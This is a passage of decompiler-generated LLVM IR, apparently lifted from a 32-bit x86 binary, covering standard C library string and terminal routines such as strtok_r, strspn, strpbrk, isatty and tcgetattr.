  %v0_804c49f = phi i32 [ %v4_804c482, %dec_label_pc_804c494 ], [ %v4_804c49a, %dec_label_pc_804c496 ]
  %v3_804c49f = inttoptr i32 %v1_804c49f to i8*
  %v4_804c49f = inttoptr i32 %v0_804c49f to i8*
  %v5_804c49f = call i8* @_memcpy(i8* %v4_804c49f, i8* %v3_804c49f, i32 %tmp)
  store i1 false, i1* @df, align 1
  %v2_804c4a2.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804c4a2

dec_label_pc_804c4a2:                             ; preds = %entry, %dec_label_pc_804c49f
  %v2_804c4a2 = phi i32 [ %v0_804c481, %entry ], [ %v2_804c4a2.pre, %dec_label_pc_804c49f ]
  store i32 %v2_804c4a2, i32* @esi, align 4
  ret i32 %v4_804c482

; uselistorder directives
  uselistorder i32 %v4_804c482, { 3, 1, 2, 4, 0 }
  uselistorder i32 %tmp, { 1, 2, 0 }
  uselistorder i32 %arg2, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_804c4a2, { 1, 0 }
  uselistorder label %dec_label_pc_804c49f, { 1, 0 }
}

define i32 @strrchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804c4a8 = ptrtoint i8* %arg1 to i32
  %v2_804c4b2 = mul i32 %arg2, 256
  %v3_804c4b2 = and i32 %v2_804c4b2, 65280
  %v4_804c4b2 = and i32 %arg2, -65281
  %v5_804c4b2 = or i32 %v3_804c4b2, %v4_804c4b2
  br label %dec_label_pc_804c4b4

dec_label_pc_804c4b4:                             ; preds = %dec_label_pc_804c4bc, %entry
  %v0_804c4c13 = phi i32 [ %v0_804c4c1, %dec_label_pc_804c4bc ], [ 0, %entry ]
  %v4_804c4b4 = phi i32 [ %v6_804c4b4, %dec_label_pc_804c4bc ], [ %v5_804c4b2, %entry ]
  %v0_804c4bc = phi i32 [ %v1_804c4bc, %dec_label_pc_804c4bc ], [ %v4_804c4a8, %entry ]
  %v1_804c4b4 = inttoptr i32 %v0_804c4bc to i8*
  %v2_804c4b4 = load i8, i8* %v1_804c4b4, align 1
  %v3_804c4b4 = zext i8 %v2_804c4b4 to i32
  %v5_804c4b4 = and i32 %v4_804c4b4, -256
  %v6_804c4b4 = or i32 %v3_804c4b4, %v5_804c4b4
  %v1_804c4b6 = udiv i32 %v4_804c4b4, 256
  %v2_804c4b6 = trunc i32 %v1_804c4b6 to i8
  %v16_804c4b6 = icmp eq i8 %v2_804c4b6, %v2_804c4b4
  %v1_804c4b8 = icmp eq i1 %v16_804c4b6, false
  br i1 %v1_804c4b8, label %dec_label_pc_804c4bc, label %dec_label_pc_804c4ba

dec_label_pc_804c4ba:                             ; preds = %dec_label_pc_804c4b4
  br label %dec_label_pc_804c4bc

dec_label_pc_804c4bc:                             ; preds = %dec_label_pc_804c4b4, %dec_label_pc_804c4ba
  %v0_804c4c1 = phi i32 [ %v0_804c4c13, %dec_label_pc_804c4b4 ], [ %v0_804c4bc, %dec_label_pc_804c4ba ]
  %v1_804c4bc = add i32 %v0_804c4bc, 1
  %v4_804c4bd = icmp eq i8 %v2_804c4b4, 0
  %v1_804c4bf = icmp eq i1 %v4_804c4bd, false
  br i1 %v1_804c4bf, label %dec_label_pc_804c4b4, label %dec_label_pc_804c4c1

dec_label_pc_804c4c1:                             ; preds = %dec_label_pc_804c4bc
  ret i32 %v0_804c4c1

; uselistorder directives
  uselistorder i8 %v2_804c4b4, { 1, 0, 2 }
  uselistorder i32 %v0_804c4bc, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804c4bc, { 1, 0 }
}

define i32 @__GI_strchrnul() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %v4_804c4c5 = ptrtoint i8* %tmp5 to i32
  %v2_804c4cd = mul i32 %tmp, 256
  %v3_804c4cd = and i32 %v2_804c4cd, 65280
  %v4_804c4cd = and i32 %tmp, -65281
  %v5_804c4cd = or i32 %v3_804c4cd, %v4_804c4cd
  %v8_804c4cf.pre = load i1, i1* @df, align 1
  %v9_804c4cf = select i1 %v8_804c4cf.pre, i32 -1, i32 1
  br label %dec_label_pc_804c4cf

dec_label_pc_804c4cf:                             ; preds = %dec_label_pc_804c4d4, %entry
  %v4_804c4cf = phi i32 [ %v6_804c4cf, %dec_label_pc_804c4d4 ], [ %v5_804c4cd, %entry ]
  %v7_804c4cf = phi i32 [ %v10_804c4cf, %dec_label_pc_804c4d4 ], [ %v4_804c4c5, %entry ]
  %v1_804c4cf = inttoptr i32 %v7_804c4cf to i8*
  %v2_804c4cf = load i8, i8* %v1_804c4cf, align 1
  %v10_804c4cf = add i32 %v7_804c4cf, %v9_804c4cf
  %v3_804c4d0 = udiv i32 %v4_804c4cf, 256
  %v4_804c4d0 = trunc i32 %v3_804c4d0 to i8
  %v16_804c4d0 = icmp eq i8 %v2_804c4cf, %v4_804c4d0
  br i1 %v16_804c4d0, label %dec_label_pc_804c4d8, label %dec_label_pc_804c4d4

dec_label_pc_804c4d4:                             ; preds = %dec_label_pc_804c4cf
  %v3_804c4cf = zext i8 %v2_804c4cf to i32
  %v5_804c4cf = and i32 %v4_804c4cf, -256
  %v6_804c4cf = or i32 %v3_804c4cf, %v5_804c4cf
  %v4_804c4d4 = icmp eq i8 %v2_804c4cf, 0
  %v1_804c4d6 = icmp eq i1 %v4_804c4d4, false
  br i1 %v1_804c4d6, label %dec_label_pc_804c4cf, label %dec_label_pc_804c4d8

dec_label_pc_804c4d8:                             ; preds = %dec_label_pc_804c4d4, %dec_label_pc_804c4cf
  %v1_804c4d8 = add i32 %v10_804c4cf, -1
  ret i32 %v1_804c4d8

; uselistorder directives
  uselistorder i8 %v2_804c4cf, { 1, 2, 0 }
  uselistorder i32 %v4_804c4cf, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %v2_804c4ef = udiv i32 %arg3, 4
  %v4_804c4f2 = ptrtoint i8* %arg1 to i32
  %v7_804c4f6 = call i8* @_memcpy(i8* %arg1, i8* %tmp5, i32 %v2_804c4ef)
  %v1_804c4fa = urem i32 %arg3, 4
  %v2_804c4fa = icmp eq i32 %v1_804c4fa, 0
  store i32 %v1_804c4fa, i32* @ecx, align 4
  br i1 %v2_804c4fa, label %bb, label %dec_label_pc_804c4ff

dec_label_pc_804c4ff:                             ; preds = %entry
  %v7_804c4ff = call i8* @_memcpy(i8* %arg1, i8* %tmp5, i32 %v1_804c4fa)
  %v8_804c4ff = ptrtoint i8* %v7_804c4ff to i32
  store i32 %v8_804c4ff, i32* @ecx, align 4
  br label %bb

bb:                                               ; preds = %entry, %dec_label_pc_804c4ff
  %v2_804c505 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c505, i32* @edx, align 4
  ret i32 %v4_804c4f2

; uselistorder directives
  uselistorder i32 %v1_804c4fa, { 2, 1, 0 }
  uselistorder i8* %tmp5, { 1, 0 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c50c = load i32, i32* @edi, align 4
  %v0_804c50d = load i32, i32* @esi, align 4
  %v0_804c50e = load i32, i32* @ebx, align 4
  store i32 %v0_804c50e, i32* %stack_var_-12, align 4
  %v4_804c50f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804c50f, i32* @ebx, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804c51b = icmp eq i8* %arg1, null
  %v1_804c51d = icmp eq i1 %v1_804c51b, false
  br i1 %v1_804c51d, label %dec_label_pc_804c521, label %dec_label_pc_804c51f

dec_label_pc_804c51f:                             ; preds = %entry
  %v1_804c51f = inttoptr i32 %arg3 to i32*
  %v2_804c51f = load i32, i32* %v1_804c51f, align 4
  store i32 %v2_804c51f, i32* @ebx, align 4
  br label %dec_label_pc_804c521

dec_label_pc_804c521:                             ; preds = %entry, %dec_label_pc_804c51f
  %v0_804c522 = phi i32 [ %v4_804c50f, %entry ], [ %v2_804c51f, %dec_label_pc_804c51f ]
  %v5_804c522 = inttoptr i32 %v0_804c522 to i8*
  %v4_804c523 = call i32 @__GI_strspn(i8* %v5_804c522, i32 %arg2)
  store i32 %v0_804c522, i32* @ecx, align 4
  %v0_804c52a = load i32, i32* @ebx, align 4
  %v2_804c52a = add i32 %v0_804c52a, %v4_804c523
  store i32 %v2_804c52a, i32* @ebx, align 4
  %v1_804c52c = inttoptr i32 %v2_804c52a to i8*
  %v2_804c52c = load i8, i8* %v1_804c52c, align 1
  %v3_804c52c = icmp eq i8 %v2_804c52c, 0
  %v1_804c52f = icmp eq i1 %v3_804c52c, false
  br i1 %v1_804c52f, label %dec_label_pc_804c537, label %dec_label_pc_804c531

dec_label_pc_804c531:                             ; preds = %dec_label_pc_804c521
  %v1_804c531 = load i32, i32* @esi, align 4
  %v2_804c531 = inttoptr i32 %v1_804c531 to i32*
  store i32 %v2_804c52a, i32* %v2_804c531, align 4
  br label %dec_label_pc_804c558

dec_label_pc_804c537:                             ; preds = %dec_label_pc_804c521
  %v0_804c537 = load i32, i32* %edi.global-to-local, align 4
  %v4_804c539 = call i32 @__GI_strpbrk(i8* %v1_804c52c, i32 %v0_804c537)
  store i32 %v2_804c52a, i32* @edi, align 4
  %v2_804c540 = icmp eq i32 %v4_804c539, 0
  %v1_804c542 = icmp eq i1 %v2_804c540, false
  br i1 %v1_804c542, label %dec_label_pc_804c550, label %dec_label_pc_804c544

dec_label_pc_804c544:                             ; preds = %dec_label_pc_804c537
  %v0_804c546 = load i32, i32* @ebx, align 4
  %v5_804c546 = inttoptr i32 %v0_804c546 to i8*
  %v4_804c547 = call i32 @rawmemchr(i8* %v5_804c546, i32 0)
  store i32 0, i32* @ecx, align 4
  br label %dec_label_pc_804c554

dec_label_pc_804c550:                             ; preds = %dec_label_pc_804c537
  %v5_804c539 = inttoptr i32 %v4_804c539 to i8*
  store i8 0, i8* %v5_804c539, align 1
  %v2_804c553 = add i32 %v4_804c539, 1
  br label %dec_label_pc_804c554

dec_label_pc_804c554:                             ; preds = %dec_label_pc_804c544, %dec_label_pc_804c550
  %v0_804c554 = phi i32 [ %v4_804c547, %dec_label_pc_804c544 ], [ %v2_804c553, %dec_label_pc_804c550 ]
  %v1_804c554 = load i32, i32* @esi, align 4
  %v2_804c554 = inttoptr i32 %v1_804c554 to i32*
  store i32 %v0_804c554, i32* %v2_804c554, align 4
  %v0_804c556 = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c558

dec_label_pc_804c558:                             ; preds = %dec_label_pc_804c531, %dec_label_pc_804c554
  %storemerge = phi i32 [ 0, %dec_label_pc_804c531 ], [ %v0_804c556, %dec_label_pc_804c554 ]
  %v2_804c558 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c558, i32* @ebx, align 4
  store i32 %v0_804c50d, i32* @esi, align 4
  store i32 %v0_804c50c, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804c539, { 0, 2, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c558, { 1, 0 }
  uselistorder label %dec_label_pc_804c554, { 1, 0 }
  uselistorder label %dec_label_pc_804c521, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-12 = alloca i32, align 4
  %v0_804c55d = load i32, i32* @esi, align 4
  %v0_804c55e = load i32, i32* @ebx, align 4
  store i32 %v0_804c55e, i32* %stack_var_-12, align 4
  %v4_804c55f = ptrtoint i8* %tmp5 to i32
  store i32 %v4_804c55f, i32* %ebx.global-to-local, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v2_804c57d14 = load i8, i8* %tmp5, align 1
  %v4_804c57f16 = icmp eq i8 %v2_804c57d14, 0
  %v1_804c58117 = icmp eq i1 %v4_804c57f16, false
  br i1 %v1_804c58117, label %dec_label_pc_804c56b, label %dec_label_pc_804c583

dec_label_pc_804c56b:                             ; preds = %entry, %dec_label_pc_804c57b.dec_label_pc_804c56b_crit_edge
  %v0_804c56f = phi i32 [ %v0_804c56f.pre, %dec_label_pc_804c57b.dec_label_pc_804c56b_crit_edge ], [ %tmp, %entry ]
  %v3_804c57d18.in = phi i8 [ %v2_804c57d, %dec_label_pc_804c57b.dec_label_pc_804c56b_crit_edge ], [ %v2_804c57d14, %entry ]
  %v3_804c57d18 = zext i8 %v3_804c57d18.in to i32
  %v2_804c570 = inttoptr i32 %v0_804c56f to i8*
  %v3_804c570 = call i32 @__GI_strchr(i8* %v2_804c570, i32 %v3_804c57d18)
  %v1_804c577 = icmp eq i32 %v3_804c570, 0
  %v1_804c579 = icmp eq i1 %v1_804c577, false
  br i1 %v1_804c579, label %dec_label_pc_804c56b.dec_label_pc_804c583_crit_edge, label %dec_label_pc_804c57b

dec_label_pc_804c56b.dec_label_pc_804c583_crit_edge: ; preds = %dec_label_pc_804c56b
  %v0_804c583.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c583

dec_label_pc_804c57b:                             ; preds = %dec_label_pc_804c56b
  %v0_804c57b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c57b = add i32 %v0_804c57b, 1
  store i32 %v1_804c57b, i32* %ebx.global-to-local, align 4
  %v0_804c57c = load i32, i32* @esi, align 4
  %v1_804c57c = add i32 %v0_804c57c, 1
  store i32 %v1_804c57c, i32* @esi, align 4
  %v1_804c57d = inttoptr i32 %v1_804c57b to i8*
  %v2_804c57d = load i8, i8* %v1_804c57d, align 1
  %v4_804c57f = icmp eq i8 %v2_804c57d, 0
  %v1_804c581 = icmp eq i1 %v4_804c57f, false
  br i1 %v1_804c581, label %dec_label_pc_804c57b.dec_label_pc_804c56b_crit_edge, label %dec_label_pc_804c583

dec_label_pc_804c57b.dec_label_pc_804c56b_crit_edge: ; preds = %dec_label_pc_804c57b
  %v0_804c56f.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804c56b

dec_label_pc_804c583:                             ; preds = %entry, %dec_label_pc_804c57b, %dec_label_pc_804c56b.dec_label_pc_804c583_crit_edge
  %v0_804c583 = phi i32 [ %v0_804c583.pre, %dec_label_pc_804c56b.dec_label_pc_804c583_crit_edge ], [ 0, %entry ], [ %v1_804c57c, %dec_label_pc_804c57b ]
  %v2_804c585 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c585, i32* @ebx, align 4
  store i32 %v0_804c55d, i32* @esi, align 4
  ret i32 %v0_804c583

; uselistorder directives
  uselistorder i8 %v2_804c57d, { 1, 0 }
  uselistorder label %dec_label_pc_804c583, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c56b, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c58d = load i32, i32* @ebx, align 4
  %v2_804c5a528 = load i8, i8* %arg1, align 1
  %v4_804c5a732 = icmp eq i8 %v2_804c5a528, 0
  br i1 %v4_804c5a732, label %dec_label_pc_804c5b1, label %dec_label_pc_804c59b.preheader.lr.ph

dec_label_pc_804c59b.preheader.lr.ph:             ; preds = %entry
  %v3_804c5a529 = zext i8 %v2_804c5a528 to i32
  %v5_804c5a530 = and i32 %v0_804c58d, -256
  %v6_804c5a531 = or i32 %v3_804c5a529, %v5_804c5a530
  %v4_804c58e = ptrtoint i8* %arg1 to i32
  %v1_804c59b16 = inttoptr i32 %arg2 to i8*
  %v4_804c59b.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c59b.preheader

dec_label_pc_804c596:                             ; preds = %dec_label_pc_804c59b.preheader, %dec_label_pc_804c59a
  %v6_804c59b25 = phi i32 [ %v6_804c59b, %dec_label_pc_804c59a ], [ %v6_804c59b20, %dec_label_pc_804c59b.preheader ]
  %v2_804c59b24 = phi i8 [ %v2_804c59b, %dec_label_pc_804c59a ], [ %v2_804c59b17, %dec_label_pc_804c59b.preheader ]
  %v0_804c59a23 = phi i32 [ %v1_804c59a, %dec_label_pc_804c59a ], [ %arg2, %dec_label_pc_804c59b.preheader ]
  %v15_804c596 = icmp eq i8 %v2_804c5a535, %v2_804c59b24
  br i1 %v15_804c596, label %dec_label_pc_804c5a3, label %dec_label_pc_804c59a

dec_label_pc_804c59a:                             ; preds = %dec_label_pc_804c596
  %v1_804c59a = add i32 %v0_804c59a23, 1
  store i32 %v1_804c59a, i32* @edx, align 4
  %v1_804c59b = inttoptr i32 %v1_804c59a to i8*
  %v2_804c59b = load i8, i8* %v1_804c59b, align 1
  %v3_804c59b = zext i8 %v2_804c59b to i32
  %v5_804c59b = and i32 %v6_804c59b25, -256
  %v6_804c59b = or i32 %v3_804c59b, %v5_804c59b
  %v4_804c59d = icmp eq i8 %v2_804c59b, 0
  %v1_804c59f = icmp eq i1 %v4_804c59d, false
  br i1 %v1_804c59f, label %dec_label_pc_804c596, label %dec_label_pc_804c5b1

dec_label_pc_804c5a3:                             ; preds = %dec_label_pc_804c596
  %v1_804c5a3 = add i32 %v0_804c5b133, 1
  %v1_804c5a4 = add i32 %v0_804c5a434, 1
  %v1_804c5a5 = inttoptr i32 %v1_804c5a4 to i8*
  %v2_804c5a5 = load i8, i8* %v1_804c5a5, align 1
  %v3_804c5a5 = zext i8 %v2_804c5a5 to i32
  %v5_804c5a5 = and i32 %v6_804c5a536, -256
  %v6_804c5a5 = or i32 %v3_804c5a5, %v5_804c5a5
  %v4_804c5a7 = icmp eq i8 %v2_804c5a5, 0
  br i1 %v4_804c5a7, label %dec_label_pc_804c5b1, label %dec_label_pc_804c59b.preheader

dec_label_pc_804c59b.preheader:                   ; preds = %dec_label_pc_804c59b.preheader.lr.ph, %dec_label_pc_804c5a3
  %v4_804c59b.pre = phi i32 [ %v4_804c59b.pre.pre, %dec_label_pc_804c59b.preheader.lr.ph ], [ %v6_804c59b25, %dec_label_pc_804c5a3 ]
  %v6_804c5a536 = phi i32 [ %v6_804c5a531, %dec_label_pc_804c59b.preheader.lr.ph ], [ %v6_804c5a5, %dec_label_pc_804c5a3 ]
  %v2_804c5a535 = phi i8 [ %v2_804c5a528, %dec_label_pc_804c59b.preheader.lr.ph ], [ %v2_804c5a5, %dec_label_pc_804c5a3 ]
  %v0_804c5a434 = phi i32 [ %v4_804c58e, %dec_label_pc_804c59b.preheader.lr.ph ], [ %v1_804c5a4, %dec_label_pc_804c5a3 ]
  %v0_804c5b133 = phi i32 [ 0, %dec_label_pc_804c59b.preheader.lr.ph ], [ %v1_804c5a3, %dec_label_pc_804c5a3 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804c59b17 = load i8, i8* %v1_804c59b16, align 1
  %v3_804c59b18 = zext i8 %v2_804c59b17 to i32
  %v5_804c59b19 = and i32 %v4_804c59b.pre, -256
  %v6_804c59b20 = or i32 %v3_804c59b18, %v5_804c59b19
  %v4_804c59d21 = icmp eq i8 %v2_804c59b17, 0
  %v1_804c59f22 = icmp eq i1 %v4_804c59d21, false
  br i1 %v1_804c59f22, label %dec_label_pc_804c596, label %dec_label_pc_804c5b1

dec_label_pc_804c5b1:                             ; preds = %entry, %dec_label_pc_804c5a3, %dec_label_pc_804c59b.preheader, %dec_label_pc_804c59a
  %v0_804c5b115 = phi i32 [ %v0_804c5b133, %dec_label_pc_804c59a ], [ %v0_804c5b133, %dec_label_pc_804c59b.preheader ], [ 0, %entry ], [ %v1_804c5a3, %dec_label_pc_804c5a3 ]
  store i32 %v0_804c58d, i32* @ebx, align 4
  ret i32 %v0_804c5b115

; uselistorder directives
  uselistorder i8 %v2_804c59b17, { 1, 2, 0 }
  uselistorder i32 %v1_804c5a4, { 1, 0 }
  uselistorder i8 %v2_804c59b, { 1, 2, 0 }
  uselistorder i32 %v1_804c59a, { 2, 1, 0 }
  uselistorder i8 %v2_804c5a528, { 0, 2, 1 }
  uselistorder i32 %v0_804c58d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c5b1, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804c59b.preheader, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c5b8 = load i32, i32* @ebx, align 4
  %v2_804c5cb22 = load i8, i8* %arg1, align 1
  %v4_804c5cd26 = icmp eq i8 %v2_804c5cb22, 0
  br i1 %v4_804c5cd26, label %dec_label_pc_804c5d7, label %dec_label_pc_804c5c4.preheader.lr.ph

dec_label_pc_804c5c4.preheader.lr.ph:             ; preds = %entry
  %v3_804c5cb23 = zext i8 %v2_804c5cb22 to i32
  %v5_804c5cb24 = and i32 %v0_804c5b8, -256
  %v6_804c5cb25 = or i32 %v3_804c5cb23, %v5_804c5cb24
  %v4_804c5b9 = ptrtoint i8* %arg1 to i32
  %v1_804c5c411 = inttoptr i32 %arg2 to i8*
  %v4_804c5c4.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c5c4.preheader

dec_label_pc_804c5bf:                             ; preds = %dec_label_pc_804c5c4.preheader, %dec_label_pc_804c5c3
  %v6_804c5c420 = phi i32 [ %v6_804c5c4, %dec_label_pc_804c5c3 ], [ %v6_804c5c415, %dec_label_pc_804c5c4.preheader ]
  %v2_804c5c419 = phi i8 [ %v2_804c5c4, %dec_label_pc_804c5c3 ], [ %v2_804c5c412, %dec_label_pc_804c5c4.preheader ]
  %v0_804c5c318 = phi i32 [ %v1_804c5c3, %dec_label_pc_804c5c3 ], [ %arg2, %dec_label_pc_804c5c4.preheader ]
  %v15_804c5bf = icmp eq i8 %v2_804c5c419, %v2_804c5cb29
  br i1 %v15_804c5bf, label %dec_label_pc_804c5d9, label %dec_label_pc_804c5c3

dec_label_pc_804c5c3:                             ; preds = %dec_label_pc_804c5bf
  %v1_804c5c3 = add i32 %v0_804c5c318, 1
  %v1_804c5c4 = inttoptr i32 %v1_804c5c3 to i8*
  %v2_804c5c4 = load i8, i8* %v1_804c5c4, align 1
  %v3_804c5c4 = zext i8 %v2_804c5c4 to i32
  %v5_804c5c4 = and i32 %v6_804c5c420, -256
  %v6_804c5c4 = or i32 %v3_804c5c4, %v5_804c5c4
  store i32 %v6_804c5c4, i32* @ecx, align 4
  %v4_804c5c6 = icmp eq i8 %v2_804c5c4, 0
  %v1_804c5c8 = icmp eq i1 %v4_804c5c6, false
  br i1 %v1_804c5c8, label %dec_label_pc_804c5bf, label %dec_label_pc_804c5ca

dec_label_pc_804c5ca:                             ; preds = %dec_label_pc_804c5c3, %dec_label_pc_804c5c4.preheader
  %v4_804c5c4.pre32 = phi i32 [ %v6_804c5c415, %dec_label_pc_804c5c4.preheader ], [ %v6_804c5c4, %dec_label_pc_804c5c3 ]
  %v1_804c5ca = add i32 %v0_804c5ca27, 1
  %v1_804c5cb = inttoptr i32 %v1_804c5ca to i8*
  %v2_804c5cb = load i8, i8* %v1_804c5cb, align 1
  %v3_804c5cb = zext i8 %v2_804c5cb to i32
  %v5_804c5cb = and i32 %v6_804c5cb30, -256
  %v6_804c5cb = or i32 %v3_804c5cb, %v5_804c5cb
  %v4_804c5cd = icmp eq i8 %v2_804c5cb, 0
  br i1 %v4_804c5cd, label %dec_label_pc_804c5d7, label %dec_label_pc_804c5c4.preheader

dec_label_pc_804c5c4.preheader:                   ; preds = %dec_label_pc_804c5c4.preheader.lr.ph, %dec_label_pc_804c5ca
  %v4_804c5c4.pre = phi i32 [ %v4_804c5c4.pre.pre, %dec_label_pc_804c5c4.preheader.lr.ph ], [ %v4_804c5c4.pre32, %dec_label_pc_804c5ca ]
  %v6_804c5cb30 = phi i32 [ %v6_804c5cb25, %dec_label_pc_804c5c4.preheader.lr.ph ], [ %v6_804c5cb, %dec_label_pc_804c5ca ]
  %v2_804c5cb29 = phi i8 [ %v2_804c5cb22, %dec_label_pc_804c5c4.preheader.lr.ph ], [ %v2_804c5cb, %dec_label_pc_804c5ca ]
  %v0_804c5ca27 = phi i32 [ %v4_804c5b9, %dec_label_pc_804c5c4.preheader.lr.ph ], [ %v1_804c5ca, %dec_label_pc_804c5ca ]
  %v2_804c5c412 = load i8, i8* %v1_804c5c411, align 1
  %v3_804c5c413 = zext i8 %v2_804c5c412 to i32
  %v5_804c5c414 = and i32 %v4_804c5c4.pre, -256
  %v6_804c5c415 = or i32 %v3_804c5c413, %v5_804c5c414
  store i32 %v6_804c5c415, i32* @ecx, align 4
  %v4_804c5c616 = icmp eq i8 %v2_804c5c412, 0
  %v1_804c5c817 = icmp eq i1 %v4_804c5c616, false
  br i1 %v1_804c5c817, label %dec_label_pc_804c5bf, label %dec_label_pc_804c5ca

dec_label_pc_804c5d7:                             ; preds = %dec_label_pc_804c5ca, %entry
  br label %dec_label_pc_804c5d9

dec_label_pc_804c5d9:                             ; preds = %dec_label_pc_804c5bf, %dec_label_pc_804c5d7
  %v0_804c5da = phi i32 [ 0, %dec_label_pc_804c5d7 ], [ %v0_804c5ca27, %dec_label_pc_804c5bf ]
  store i32 %v0_804c5b8, i32* @ebx, align 4
  ret i32 %v0_804c5da

; uselistorder directives
  uselistorder i32 %v6_804c5c415, { 2, 0, 1 }
  uselistorder i8 %v2_804c5c412, { 1, 2, 0 }
  uselistorder i32 %v1_804c5ca, { 1, 0 }
  uselistorder i32 %v6_804c5c4, { 1, 2, 0 }
  uselistorder i8 %v2_804c5c4, { 1, 2, 0 }
  uselistorder i32 %v1_804c5c3, { 1, 0 }
  uselistorder i8 %v2_804c5cb22, { 0, 2, 1 }
  uselistorder i32 %v0_804c5b8, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c5d9, { 1, 0 }
  uselistorder label %dec_label_pc_804c5c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c5ca, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804c5e6 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804c5eb = icmp eq i32 %v3_804c5e6, 0
  %v1_804c5ed = zext i1 %v1_804c5eb to i32
  ret i32 %v1_804c5ed
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c5f9 = load i32, i32* @esi, align 4
  store i32 %v0_804c5f9, i32* %stack_var_-8, align 4
  %v15_804c5fa = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp8, i32* %edi.global-to-local, align 4
  store i32 %v15_804c5fa, i32* %eax.global-to-local, align 4
  %v3_804c60d = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v15_804c5fa)
  %v4_804c60d = trunc i32 %v3_804c60d to i8
  store i32 %v3_804c60d, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v3_804c60d, 16777216
  %v1_804c612 = sdiv i32 %sext, 16777216
  store i32 %v1_804c612, i32* %edx.global-to-local, align 4
  %v2_804c617 = icmp eq i8 %v4_804c60d, 0
  %v1_804c619 = icmp eq i1 %v2_804c617, false
  br i1 %v1_804c619, label %dec_label_pc_804c650, label %dec_label_pc_804c61b

dec_label_pc_804c61b:                             ; preds = %entry
  %v2_804c61b = load i32, i32* %stack_var_-44, align 4
  %v1_804c61e = load i32, i32* %edi.global-to-local, align 4
  %v2_804c61e = inttoptr i32 %v1_804c61e to i32*
  store i32 %v2_804c61b, i32* %v2_804c61e, align 4
  %v1_804c624 = load i32, i32* %edi.global-to-local, align 4
  %v2_804c624 = add i32 %v1_804c624, 4
  %v3_804c624 = inttoptr i32 %v2_804c624 to i32*
  %v1_804c62b = load i32, i32* %edi.global-to-local, align 4
  %v2_804c62b = add i32 %v1_804c62b, 8
  %v3_804c62b = inttoptr i32 %v2_804c62b to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804c632 = load i32, i32* %edi.global-to-local, align 4
  %v2_804c632 = add i32 %v1_804c632, 12
  %v3_804c632 = inttoptr i32 %v2_804c632 to i32*
  store i32 %tmp3, i32* %v3_804c632, align 4
  %v4_804c635 = zext i8 %tmp to i32
  %v5_804c635 = load i32, i32* %eax.global-to-local, align 4
  %v6_804c635 = and i32 %v5_804c635, -256
  %v7_804c635 = or i32 %v6_804c635, %v4_804c635
  store i32 %v7_804c635, i32* %eax.global-to-local, align 4
  %v2_804c639 = load i32, i32* %edi.global-to-local, align 4
  %v3_804c639 = add i32 %v2_804c639, 16
  %v4_804c639 = inttoptr i32 %v3_804c639 to i8*
  store i8 %tmp, i8* %v4_804c639, align 1
  %v2_804c63c = ptrtoint i32* %stack_var_-27 to i32
